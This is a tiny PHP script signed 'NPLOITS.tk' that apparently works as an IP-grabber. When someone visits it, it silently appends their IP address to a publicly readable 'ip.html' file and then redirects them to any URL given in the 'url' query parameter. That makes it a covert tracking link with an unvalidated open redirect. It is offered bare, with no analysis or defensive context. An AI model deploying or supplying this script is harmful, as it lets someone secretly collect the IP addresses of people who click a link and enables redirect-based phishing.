<?php
$url=$_GET["url"];
$ip=$_SERVER['REMOTE_ADDR'];
$d="ip.html";
$f=fopen($d,"a+");
fwrite($f,"<br> $ip ");
fclose($f);
 header('Location:'.$url);
?>
NPLOITS.tk